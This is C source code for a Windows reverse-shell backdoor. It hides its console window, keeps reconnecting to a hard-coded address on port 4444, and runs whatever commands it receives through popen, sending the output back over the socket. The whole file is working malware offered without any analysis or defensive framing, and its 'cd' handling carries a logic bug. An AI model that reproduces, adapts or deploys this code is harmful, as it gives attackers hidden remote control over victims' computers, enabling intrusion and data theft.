//Standard libraries
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

// Windows specific libraries
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>


//Global socket variable
int sock;

//String cutting function
char *str_cut(char str[], int slice_from, int slice_to){
	if (str[0] == '\0')
			return NULL;
	char *buf;
	size_t str_len, buf_len;

	if(slice_to < 0 && slice_from > slice_to){
			str_len = strlen(str);
			if (abs(slice_to) > str_len - 1)
					return NULL;

			if (abs(slice_from) > str_len)
					slice_from = (-1) * str_len;
			buf_len = slice_to - slice_from;
			str += (str_len + slice_from);
	} 
	else if (slice_from >= 0 && slice_to > slice_from){
			str_len = strlen(str);

			if(slice_from > str_len - 1)
					return NULL;
			buf_len = slice_to - slice_from;
			str += slice_from;
	}
	else
			return NULL;

	buf = calloc(buf_len, sizeof(char));
	strncpy(buf, str, buf_len);
	return buf;
}

//Shell function to execute commands
void CSH(){
	char buf[1024];
	char cnt[1024];
	char tot_rsp[18384];

	while(1){
		jump:
		memset(buf, 0, (sizeof(buf)));
		memset(cnt, 0, (sizeof(cnt)));
		memset(tot_rsp, 0, (sizeof(tot_rsp)));
		recv(sock,buf, 1024, 0);

		if (strncmp("q", buf, 1) == 0){
				closesocket(sock);
				WSACleanup();
				exit(0);
		}
		else if (strncmp("cd ", buf, 3)){
			chdir(str_cut(buf,3,100));
		}
		else {
				FILE *fp;
				fp = _popen(buf, "r");
				while(fgets(cnt,1024,fp) != NULL) {
						strcat(tot_rsp,cnt);
				}
				send(sock, tot_rsp, sizeof(tot_rsp),0);
				fclose(fp);
		}				
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	//Defining the parameters for the reverse connection
	struct sockaddr_in srv_add;
	unsigned short srv_p;
	char *srv_adr;
	WSADATA wsa;
	
	//The IP and Port of the connection
	srv_adr = "192.168.0.83";
	srv_p = 4444;

	//Creating an handler to the window and hiding it
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
	
	//Checking the status of WSAStartup
	if(WSAStartup(MAKEWORD(2,0), &wsa) != 0) {
		exit(1);
	}
    //Initializing the socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
	
    //Clearing and setting up ServAddr
	memset(&srv_add, 0, sizeof(srv_add));
	srv_add.sin_family = AF_INET;
	srv_add.sin_addr.s_addr = inet_addr(srv_adr);
	srv_add.sin_port = htons(srv_p);

	//Estabilish the connection
	start:
	while (connect(sock, (struct sockaddr *) &srv_add, sizeof(srv_add)) != 0) {
		sleep(5);
		goto start;
	}
	CSH();
}
